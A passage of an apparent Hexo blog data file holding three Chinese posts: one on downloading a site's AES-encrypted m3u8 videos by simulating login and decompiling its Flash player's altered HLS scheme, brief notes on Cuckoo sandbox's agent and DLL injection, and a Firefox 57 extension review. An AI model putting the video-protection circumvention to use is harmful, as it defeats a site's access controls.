#EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0x928f18982f6ee1a7e36cfa8f36979c3a\n    #EXTINF:10.000000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg2\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0x6651941d56de8af0c7d4bee9ae33a8de\n    #EXTINF:10.000000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg3\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0x90df003d61ba2ef9413fdaf521cfce15\n    #EXTINF:10.000000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg4\n    #EXT-X-KEY:METHOD=AES-128,URI=\"http://ztest.qiniudn.com/crypt0.key\",IV=0xc7773183806b8d3d7e44811076ed5b66\n    #EXTINF:2.200000,\n    http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg5\n    #EXT-X-ENDLIST\n```\n\nm3u8内容如上所示，解析时一般是根据`EXT-X-KEY`中的`METHOD`的加密方法和`URI`链接下载密钥内容，最终结合`IV`解密后续的分片url。\n\n### 3. 变种\n\n上述是正常的播放过程，但是对该网站解析时却失败了，解密出来的结果却不是正常的视频，多次尝试后，唯一的剩下的可能性便是这个Flash播放器采用了变种HLS协议。\n\n使用[ffdec](https://www.free-decompiler.com/flash/download/)打开下载得到的Flash播放文件，阅读其中的代码，果然并非标准的HLS协议。\n","slug":"Crack-M3U8","published":1,"updated":"2020-09-07T02:31:06.564Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmk0008xrn53le66f6i","content":"<hr>\n<h1 id=\"破解某网站m3u8视频资源\"><a href=\"#破解某网站m3u8视频资源\" class=\"headerlink\" title=\"破解某网站m3u8视频资源\"></a>破解某网站m3u8视频资源</h1><h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>某个视频教学网站资源即将超过有效期，因此尝试将网页上的视频下载到本地。</p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><h3 id=\"1-登录验证\"><a href=\"#1-登录验证\" class=\"headerlink\" title=\"1. 登录验证\"></a>1. 登录验证</h3><p>这部分非常简单，模拟提交登录表单，并及时保存对应的Cookie即可</p>\n<h3 id=\"2-视频播放流程\"><a href=\"#2-视频播放流程\" class=\"headerlink\" title=\"2. 视频播放流程\"></a>2. 视频播放流程</h3><p>这个网页上使用了一个Flash播放器，然后通过该Flash文件读取m3u8文件进行播放。</p>\n<p>HTTP Live Streaming（HLS）是苹果公司(Apple Inc.)实现的基于HTTP的流媒体传输协议，m3u8，是HTTP Live Streaming直播的索引文件。该文件包含了这个视频的一系列视频分片，Flash播放器或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#EXTM3U</span><br><span class=\"line\">#EXT-X-VERSION:3</span><br><span class=\"line\">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class=\"line\">#EXT-X-ALLOW-CACHE:YES</span><br><span class=\"line\">#EXT-X-TARGETDURATION:11</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0xe532855feb3e18366b8e7ea0c11f3116</span><br><span class=\"line\">#EXTINF:10.066667,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg0</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0x48586a2ac8397fbce9565480259c1b94</span><br><span class=\"line\">#EXTINF:10.000000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg1</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0x928f18982f6ee1a7e36cfa8f36979c3a</span><br><span class=\"line\">#EXTINF:10.000000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg2</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0x6651941d56de8af0c7d4bee9ae33a8de</span><br><span class=\"line\">#EXTINF:10.000000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg3</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0x90df003d61ba2ef9413fdaf521cfce15</span><br><span class=\"line\">#EXTINF:10.000000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg4</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0xc7773183806b8d3d7e44811076ed5b66</span><br><span class=\"line\">#EXTINF:2.200000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg5</span><br><span class=\"line\">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>\n\n<p>m3u8内容如上所示，解析时一般是根据<code>EXT-X-KEY</code>中的<code>METHOD</code>的加密方法和<code>URI</code>链接下载密钥内容，最终结合<code>IV</code>解密后续的分片url。</p>\n<h3 id=\"3-变种\"><a href=\"#3-变种\" class=\"headerlink\" title=\"3. 变种\"></a>3. 变种</h3><p>上述是正常的播放过程，但是对该网站解析时却失败了，解密出来的结果却不是正常的视频，多次尝试后，唯一的剩下的可能性便是这个Flash播放器采用了变种HLS协议。</p>\n<p>使用<a href=\"https://www.free-decompiler.com/flash/download/\">ffdec</a>打开下载得到的Flash播放文件，阅读其中的代码，果然并非标准的HLS协议。</p>\n","excerpt":"","more":"<hr>\n<h1 id=\"破解某网站m3u8视频资源\"><a href=\"#破解某网站m3u8视频资源\" class=\"headerlink\" title=\"破解某网站m3u8视频资源\"></a>破解某网站m3u8视频资源</h1><h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>某个视频教学网站资源即将超过有效期，因此尝试将网页上的视频下载到本地。</p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><h3 id=\"1-登录验证\"><a href=\"#1-登录验证\" class=\"headerlink\" title=\"1. 登录验证\"></a>1. 登录验证</h3><p>这部分非常简单，模拟提交登录表单，并及时保存对应的Cookie即可</p>\n<h3 id=\"2-视频播放流程\"><a href=\"#2-视频播放流程\" class=\"headerlink\" title=\"2. 视频播放流程\"></a>2. 视频播放流程</h3><p>这个网页上使用了一个Flash播放器，然后通过该Flash文件读取m3u8文件进行播放。</p>\n<p>HTTP Live Streaming（HLS）是苹果公司(Apple Inc.)实现的基于HTTP的流媒体传输协议，m3u8，是HTTP Live Streaming直播的索引文件。该文件包含了这个视频的一系列视频分片，Flash播放器或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#EXTM3U</span><br><span class=\"line\">#EXT-X-VERSION:3</span><br><span class=\"line\">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class=\"line\">#EXT-X-ALLOW-CACHE:YES</span><br><span class=\"line\">#EXT-X-TARGETDURATION:11</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0xe532855feb3e18366b8e7ea0c11f3116</span><br><span class=\"line\">#EXTINF:10.066667,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg0</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0x48586a2ac8397fbce9565480259c1b94</span><br><span class=\"line\">#EXTINF:10.000000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg1</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0x928f18982f6ee1a7e36cfa8f36979c3a</span><br><span class=\"line\">#EXTINF:10.000000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg2</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0x6651941d56de8af0c7d4bee9ae33a8de</span><br><span class=\"line\">#EXTINF:10.000000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg3</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0x90df003d61ba2ef9413fdaf521cfce15</span><br><span class=\"line\">#EXTINF:10.000000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg4</span><br><span class=\"line\">#EXT-X-KEY:METHOD=AES-128,URI=&quot;http://ztest.qiniudn.com/crypt0.key&quot;,IV=0xc7773183806b8d3d7e44811076ed5b66</span><br><span class=\"line\">#EXTINF:2.200000,</span><br><span class=\"line\">http://ztest.qiniudn.com/Fr88-3sZu8HqPFot_BapyYtuz3k=/FgCBc3IlydY6CFIA8jhe7jIxCt1y/seg5</span><br><span class=\"line\">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>\n\n<p>m3u8内容如上所示，解析时一般是根据<code>EXT-X-KEY</code>中的<code>METHOD</code>的加密方法和<code>URI</code>链接下载密钥内容，最终结合<code>IV</code>解密后续的分片url。</p>\n<h3 id=\"3-变种\"><a href=\"#3-变种\" class=\"headerlink\" title=\"3. 变种\"></a>3. 变种</h3><p>上述是正常的播放过程，但是对该网站解析时却失败了，解密出来的结果却不是正常的视频，多次尝试后，唯一的剩下的可能性便是这个Flash播放器采用了变种HLS协议。</p>\n<p>使用<a href=\"https://www.free-decompiler.com/flash/download/\">ffdec</a>打开下载得到的Flash播放文件，阅读其中的代码，果然并非标准的HLS协议。</p>\n"},{"title":"Cuckoo代码学习一","date":"2015-06-13T20:18:40.000Z","_content":"\n## 虚拟机监控部分\n\nAgent\n\n主要功能：\n\n使用SimpleXMLRPCServer建立一个服务器监听Cuckoo发送的数据。\n\ndll注入\n\n使用了远程DLL注入技术，\n\n参考文档[远程DLL注入技术](http://www.programlife.net/remote-thread-dll-injection.html)\n\n监控\n","source":"_posts/Cuckoo-1.md","raw":"title: \"Cuckoo代码学习一\"\ndate: 2015-06-13 20:18:40\ntags:\n---\n\n## 虚拟机监控部分\n\nAgent\n\n主要功能：\n\n使用SimpleXMLRPCServer建立一个服务器监听Cuckoo发送的数据。\n\ndll注入\n\n使用了远程DLL注入技术，\n\n参考文档[远程DLL注入技术](http://www.programlife.net/remote-thread-dll-injection.html)\n\n监控\n","slug":"Cuckoo-1","published":1,"updated":"2020-09-07T02:31:06.565Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmml0009xrn5ea8actpe","content":"<h2 id=\"虚拟机监控部分\"><a href=\"#虚拟机监控部分\" class=\"headerlink\" title=\"虚拟机监控部分\"></a>虚拟机监控部分</h2><p>Agent</p>\n<p>主要功能：</p>\n<p>使用SimpleXMLRPCServer建立一个服务器监听Cuckoo发送的数据。</p>\n<p>dll注入</p>\n<p>使用了远程DLL注入技术，</p>\n<p>参考文档<a href=\"http://www.programlife.net/remote-thread-dll-injection.html\">远程DLL注入技术</a></p>\n<p>监控</p>\n","excerpt":"","more":"<h2 id=\"虚拟机监控部分\"><a href=\"#虚拟机监控部分\" class=\"headerlink\" title=\"虚拟机监控部分\"></a>虚拟机监控部分</h2><p>Agent</p>\n<p>主要功能：</p>\n<p>使用SimpleXMLRPCServer建立一个服务器监听Cuckoo发送的数据。</p>\n<p>dll注入</p>\n<p>使用了远程DLL注入技术，</p>\n<p>参考文档<a href=\"http://www.programlife.net/remote-thread-dll-injection.html\">远程DLL注入技术</a></p>\n<p>监控</p>\n"},{"title":"Firefox57新版试用","date":"2017-11-26T17:18:30.000Z","_content":"\n# 浏览器使用历史\n\n## 早期试用\n\n记得最早使用的浏览器是傲游，后来短暂使用了一段时间的搜狗之后就一直改用Firefox，即使Chrome出来后，短暂使用过，但是后面还是继续选择使用Firefox。\n\nFirefox给我的第一印象就是丰富的插件，相比早期的IE和国内一众基于IE内核的浏览器，插件功能更加强大，特别是那会惊为天人的Adblock Plus让我摆脱了页面上各种眼花缭乱的广告。而另外一个插件Downthem All则让我在大多数情况下不需要启动迅雷来多线程下载一个本来就不会花费太多下载时间的文件链接，尤其。\n\n## Chrome\n\n虽然后来出现了速度更加快的Chrome，但是一开始的某些插件（例如Adblock）并不完善，并且处于对隐私方面的考虑，仍然坚持使用Firefox。\n\nChrome也在不停的进步，各种功能不断完善，所以目前我主要会在调试网页的时候试用Chrome。\n\n## Firefox缺点\n\n目前使用的感觉主要是实在是太慢了，标签一多经常性的会出现卡死。在Windows下仍然是32位，所以都会单独下载第三方编译版本（例如pcxfirefox），而在Linux/Mac下使用时，则要经常性的重启下。\n\n为了应对Chrome的竞争，近两年来Firefox的采取了更加激进的更新策略，但是随之而来的却是每个版本一旦更新，一些插件就会失效，特别是Autoproxy这个插件，一度让我想放弃Firefox。而近期，则完全抛弃了原有的插件支持，引入了基于WebExtension的插件，增加了插件的通用性，提高了安全性。\n\n# Firefox 57试用体验\n\n第一次装上Firefox57后，的确觉得其速度变快很多，但是仔细观察下来，更多的感觉快是显示在了页面加载到完成渲染的过程中，\n\n## 新版附加组件列表\n\n因为大量的插件不再可用，所有需要重新选择浏览器插件，这是我在Firefox 57上所使用的新版插件列表，基本能够满足我的日常需求。\n\n### Evernote Web Clipper\n\n### Greasemonkey\n\n虽然有人推荐试用Tampermonkey替代，但是目前为止Greasemonkey对于我仍然能够满足需求。\n\n### HTTPS Everywhere\n\n自动跳转到该网站的HTTPS版本，随着HTTPS的不断普及，相信这个插件会逐渐失去其功能。\n\n### LastPass\n\n密码管理，类似的还有其他几款管理软件。\n\n### Proxy SwitchyMmega\n\n以前的代理插件AutoProxy及后续的第三方更改版本基本每次Firefox一升级就要死一大片然后重新找，现在这个插件是Chrome上的对应移植版本，不用再担心一升级就失效了。目前试用国产中仍然感觉有一些bug。\n\n### uBlock Origin\n\n新一代的广告过滤插件，对于Adblock Plus有着较大的优势。目前Adblock Plus已经堕落了，在社区内引起了几次争论，使得大家都对其持怀疑态度。\n\n### uMatrix\n\n用于屏蔽网页无关脚本，可以辅助屏蔽第三方追踪脚本，是NoScript的替代品。\n\n### Vimium\n\nVim快捷键插件，但是比原来的Vimperator权限小了很多，页面加载完成后才有效果。\n\n### Open Tabs Next to Current\n\n新版插件功能不再有对标签外观和标签位置的更改能力，为此这个插件好像使用了一种方法绕过了限制，能够紧接当前标签新建一个新标签，此外在设置里面可以针对从当前页面打开的链接的标签位置进行配置。\n\n>   about:config 设置browser.tabs.insertRelatedAfterCurrent 为true\n\n## 缺少的插件\n\n### Down Them All\n\n不再有类似的多线程轻量级下载工具，需要自己额外配置第三方下载软件。\n\n## Firefox57不足\n\n目前的问题主要如下：\n\n1. Firefox57的SwitchyOmega会经常性的出现菜单显示不正常，参考[https://github.com/FelisCatus/SwitchyOmega/issues/1315]\n\n2. 在Mac下，Firefox57经常性的会出现高CPU占用情况，然后风扇狂转，最终我更换成了Firefox Nightly。","source":"_posts/Firefox57.md","raw":"title: Firefox57新版试用\ndate: 2017-11-26 17:18:30\ntags: [\"Web\"]\n---\n\n# 浏览器使用历史\n\n## 早期试用\n\n记得最早使用的浏览器是傲游，后来短暂使用了一段时间的搜狗之后就一直改用Firefox，即使Chrome出来后，短暂使用过，但是后面还是继续选择使用Firefox。\n\nFirefox给我的第一印象就是丰富的插件，相比早期的IE和国内一众基于IE内核的浏览器，插件功能更加强大，特别是那会惊为天人的Adblock Plus让我摆脱了页面上各种眼花缭乱的广告。而另外一个插件Downthem All则让我在大多数情况下不需要启动迅雷来多线程下载一个本来就不会花费太多下载时间的文件链接，尤其。\n\n## Chrome\n\n虽然后来出现了速度更加快的Chrome，但是一开始的某些插件（例如Adblock）并不完善，并且处于对隐私方面的考虑，仍然坚持使用Firefox。\n\nChrome也在不停的进步，各种功能不断完善，所以目前我主要会在调试网页的时候试用Chrome。\n\n## Firefox缺点\n\n目前使用的感觉主要是实在是太慢了，标签一多经常性的会出现卡死。在Windows下仍然是32位，所以都会单独下载第三方编译版本（例如pcxfirefox），而在Linux/Mac下使用时，则要经常性的重启下。\n\n为了应对Chrome的竞争，近两年来Firefox的采取了更加激进的更新策略，但是随之而来的却是每个版本一旦更新，一些插件就会失效，特别是Autoproxy这个插件，一度让我想放弃Firefox。而近期，则完全抛弃了原有的插件支持，引入了基于WebExtension的插件，增加了插件的通用性，提高了安全性。\n\n# Firefox 57试用体验\n\n第一次装上Firefox57后，的确觉得其速度变快很多，但是仔细观察下来，更多的感觉快是显示在了页面加载到完成渲染的过程中，\n\n## 新版附加组件列表\n\n因为大量的插件不再可用，所有需要重新选择浏览器插件，这是我在Firefox 57上所使用的新版插件列表，基本能够满足我的日常需求。\n\n### Evernote Web Clipper\n\n### Greasemonkey\n\n虽然有人推荐试用Tampermonkey替代，但是目前为止Greasemonkey对于我仍然能够满足需求。\n\n### HTTPS Everywhere\n\n自动跳转到该网站的HTTPS版本，随着HTTPS的不断普及，相信这个插件会逐渐失去其功能。\n\n### LastPass\n\n密码管理，类似的还有其他几款管理软件。\n\n### Proxy SwitchyMmega\n\n以前的代理插件AutoProxy及后续的第三方更改版本基本每次Firefox一升级就要死一大片然后重新找，现在这个插件是Chrome上的对应移植版本，不用再担心一升级就失效了。目前试用国产中仍然感觉有一些bug。\n\n### uBlock Origin\n\n新一代的广告过滤插件，对于Adblock Plus有着较大的优势。目前Adblock Plus已经堕落了，在社区内引起了几次争论，使得大家都对其持怀疑态度。\n\n### uMatrix\n\n用于屏蔽网页无关脚本，可以辅助屏蔽第三方追踪脚本，是NoScript的替代品。\n\n### Vimium\n\nVim快捷键插件，但是比原来的Vimperator权限小了很多，页面加载完成后才有效果。\n\n### Open Tabs Next to Current\n\n新版插件功能不再有对标签外观和标签位置的更改能力，为此这个插件好像使用了一种方法绕过了限制，能够紧接当前标签新建一个新标签，此外在设置里面可以针对从当前页面打开的链接的标签位置进行配置。\n\n>   about:config 设置browser.tabs.insertRelatedAfterCurrent 为true\n\n## 缺少的插件\n\n### Down Them All\n\n不再有类似的多线程轻量级下载工具，需要自己额外配置第三方下载软件。\n\n## Firefox57不足\n\n目前的问题主要如下：\n\n1. Firefox57的SwitchyOmega会经常性的出现菜单显示不正常，参考[https://github.com/FelisCatus/SwitchyOmega/issues/1315]\n\n2. 在Mac下，Firefox57经常性的会出现高CPU占用情况，然后风扇狂转，最终我更换成了Firefox Nightly。","slug":"Firefox57","published":1,"updated":"2020-09-07T02:31:06.565Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmm000axrn526s810ft","content":"<h1 id=\"浏览器使用历史\"><a href=\"#浏览器使用历史\" class=\"headerlink\" title=\"浏览器使用历史\"></a>浏览器使用历史</h1><h2 id=\"早期试用\"><a href=\"#早期试用\" class=\"headerlink\" title=\"早期试用\"></a>早期试用</h2><p>记得最早使用的浏览器是傲游，后来短暂使用了一段时间的搜狗之后就一直改用Firefox，即使Chrome出来后，短暂使用过，但是后面还是继续选择使用Firefox。</p>\n<p>Firefox给我的第一印象就是丰富的插件，相比早期的IE和国内一众基于IE内核的浏览器，插件功能更加强大，特别是那会惊为天人的Adblock Plus让我摆脱了页面上各种眼花缭乱的广告。而另外一个插件Downthem All则让我在大多数情况下不需要启动迅雷来多线程下载一个本来就不会花费太多下载时间的文件链接，尤其。</p>\n<h2 id=\"Chrome\"><a href=\"#Chrome\" class=\"headerlink\" title=\"Chrome\"></a>Chrome</h2><p>虽然后来出现了速度更加快的Chrome，但是一开始的某些插件（例如Adblock）并不完善，并且处于对隐私方面的考虑，仍然坚持使用Firefox。</p>\n<p>Chrome也在不停的进步，各种功能不断完善，所以目前我主要会在调试网页的时候试用Chrome。</p>\n<h2 id=\"Firefox缺点\"><a href=\"#Firefox缺点\" class=\"headerlink\" title=\"Firefox缺点\"></a>Firefox缺点</h2><p>目前使用的感觉主要是实在是太慢了，标签一多经常性的会出现卡死。在Windows下仍然是32位，所以都会单独下载第三方编译版本（例如pcxfirefox），而在Linux&#x2F;Mac下使用时，则要经常性的重启下。</p>\n<p>为了应对Chrome的竞争，近两年来Firefox的采取了更加激进的更新策略，但是随之而来的却是每个版本一旦更新，一些插件就会失效，特别是Autoproxy这个插件，一度让我想放弃Firefox。而近期，则完全抛弃了原有的插件支持，引入了基于WebExtension的插件，增加了插件的通用性，提高了安全性。</p>\n<h1 id=\"Firefox-57试用体验\"><a href=\"#Firefox-57试用体验\" class=\"headerlink\" title=\"Firefox 57试用体验\"></a>Firefox 57试用体验</h1><p>第一次装上Firefox57后，的确觉得其速度变快很多，但是仔细观察下来，更多的感觉快是显示在了页面加载到完成渲染的过程中，</p>\n<h2 id=\"新版附加组件列表\"><a href=\"#新版附加组件列表\" class=\"headerlink\" title=\"新版附加组件列表\"></a>新版附加组件列表</h2><p>因为大量的插件不再可用，所有需要重新选择浏览器插件，这是我在Firefox 57上所使用的新版插件列表，基本能够满足我的日常需求。</p>\n<h3 id=\"Evernote-Web-Clipper\"><a href=\"#Evernote-Web-Clipper\" class=\"headerlink\" title=\"Evernote Web Clipper\"></a>Evernote Web Clipper</h3><h3 id=\"Greasemonkey\"><a href=\"#Greasemonkey\" class=\"headerlink\" title=\"Greasemonkey\"></a>Greasemonkey</h3><p>虽然有人推荐试用Tampermonkey替代，但是目前为止Greasemonkey对于我仍然能够满足需求。</p>\n<h3 id=\"HTTPS-Everywhere\"><a href=\"#HTTPS-Everywhere\" class=\"headerlink\" title=\"HTTPS Everywhere\"></a>HTTPS Everywhere</h3><p>自动跳转到该网站的HTTPS版本，随着HTTPS的不断普及，相信这个插件会逐渐失去其功能。</p>\n<h3 id=\"LastPass\"><a href=\"#LastPass\" class=\"headerlink\" title=\"LastPass\"></a>LastPass</h3><p>密码管理，类似的还有其他几款管理软件。</p>\n<h3 id=\"Proxy-SwitchyMmega\"><a href=\"#Proxy-SwitchyMmega\" class=\"headerlink\" title=\"Proxy SwitchyMmega\"></a>Proxy SwitchyMmega</h3><p>以前的代理插件AutoProxy及后续的第三方更改版本基本每次Firefox一升级就要死一大片然后重新找，现在这个插件是Chrome上的对应移植版本，不用再担心一升级就失效了。目前试用国产中仍然感觉有一些bug。</p>\n<h3 id=\"uBlock-Origin\"><a href=\"#uBlock-Origin\" class=\"headerlink\" title=\"uBlock Origin\"></a>uBlock Origin</h3><p>新一代的广告过滤插件，对于Adblock Plus有着较大的优势。目前Adblock Plus已经堕落了，在社区内引起了几次争论，使得大家都对其持怀疑态度。</p>\n<h3 id=\"uMatrix\"><a href=\"#uMatrix\" class=\"headerlink\" title=\"uMatrix\"></a>uMatrix</h3><p>用于屏蔽网页无关脚本，可以辅助屏蔽第三方追踪脚本，是NoScript的替代品。</p>\n<h3 id=\"Vimium\"><a href=\"#Vimium\" class=\"headerlink\" title=\"Vimium\"></a>Vimium</h3><p>Vim快捷键插件，但是比原来的Vimperator权限小了很多，页面加载完成后才有效果。</p>\n<h3 id=\"Open-Tabs-Next-to-Current\"><a href=\"#Open-Tabs-Next-to-Current\" class=\"headerlink\" title=\"Open Tabs Next to Current\"></a>Open Tabs Next to Current</h3><p>新版插件功能不再有对标签外观和标签位置的更改能力，为此这个插件好像使用了一种方法绕过了限制，能够紧接当前标签新建一个新标签，此外在设置里面可以针对从当前页面打开的链接的标签位置进行配置。</p>\n<blockquote>\n<p>  about:config 设置browser.tabs.insertRelatedAfterCurrent 为true</p>\n</blockquote>\n<h2 id=\"缺少的插件\"><a href=\"#缺少的插件\" class=\"headerlink\" title=\"缺少的插件\"></a>缺少的插件</h2><h3 id=\"Down-Them-All\"><a href=\"#Down-Them-All\" class=\"headerlink\" title=\"Down Them All\"></a>Down Them All</h3><p>不再有类似的多线程轻量级下载工具，需要自己额外配置第三方下载软件。</p>\n<h2 id=\"Firefox57不足\"><a href=\"#Firefox57不足\" class=\"headerlink\" title=\"Firefox57不足\"></a>Firefox57不足</h2><p>目前的问题主要如下：</p>\n<ol>\n<li><p>Firefox57的SwitchyOmega会经常性的出现菜单显示不正常，参考[<a href=\"https://github.com/FelisCatus/SwitchyOmega/issues/1315]\">https://github.com/FelisCatus/SwitchyOmega/issues/1315]</a></p>\n</li>\n<li><p>在Mac下，Firefox57经常性的会出现高CPU占用情况，然后风扇狂转，最终我更换成了Firefox Nightly。</p>\n</li>\n</ol>\n","excerpt":"","more":"<h1 id=\"浏览器使用历史\"><a href=\"#浏览器使用历史\" class=\"headerlink\" title=\"浏览器使用历史\"></a>浏览器使用历史</h1><h2 id=\"早期试用\"><a href=\"#早期试用\" class=\"headerlink\" title=\"早期试用\"></a>早期试用</h2><p>记得最早使用的浏览器是傲游，后来短暂使用了一段时间的搜狗之后就一直改用Firefox，即使Chrome出来后，短暂使用过，但是后面还是继续选择使用Firefox。</p>\n<p>Firefox给我的第一印象就是丰富的插件，相比早期的IE和国内一众基于IE内核的浏览器，插件功能更加强大，特别是那会惊为天人的Adblock Plus让我摆脱了页面上各种眼花缭乱的广告。而另外一个插件Downthem All则让我在大多数情况下不需要启动迅雷来多线程下载一个本来就不会花费太多下载时间的文件链接，尤其。</p>\n<h2 id=\"Chrome\"><a href=\"#Chrome\" class=\"headerlink\" title=\"Chrome\"></a>Chrome</h2><p>虽然后来出现了速度更加快的Chrome，但是一开始的某些插件（例如Adblock）并不完善，并且处于对隐私方面的考虑，仍然坚持使用Firefox。</p>\n<p>Chrome也在不停的进步，各种功能不断完善，所以目前我主要会在调试网页的时候试用Chrome。</p>\n<h2 id=\"Firefox缺点\"><a href=\"#Firefox缺点\" class=\"headerlink\" title=\"Firefox缺点\"></a>Firefox缺点</h2><p>目前使用的感觉主要是实在是太慢了，标签一多经常性的会出现卡死。在Windows下仍然是32位，所以都会单独下载第三方编译版本（例如pcxfirefox），而在Linux&#x2F;Mac下使用时，则要经常性的重启下。</p>\n<p>为了应对Chrome的竞争，近两年来Firefox的采取了更加激进的更新策略，但是随之而来的却是每个版本一旦更新，一些插件就会失效，特别是Autoproxy这个插件，一度让我想放弃Firefox。而近期，则完全抛弃了原有的插件支持，引入了基于WebExtension的插件，增加了插件的通用性，提高了安全性。</p>\n<h1 id=\"Firefox-57试用体验\"><a href=\"#Firefox-57试用体验\" class=\"headerlink\" title=\"Firefox 57试用体验\"></a>Firefox 57试用体验</h1><p>第一次装上Firefox57后，的确觉得其速度变快很多，但是仔细观察下来，更多的感觉快是显示在了页面加载到完成渲染的过程中，</p>\n<h2 id=\"新版附加组件列表\"><a href=\"#新版附加组件列表\" class=\"headerlink\" title=\"新版附加组件列表\"></a>新版附加组件列表</h2><p>因为大量的插件不再可用，所有需要重新选择浏览器插件，这是我在Firefox 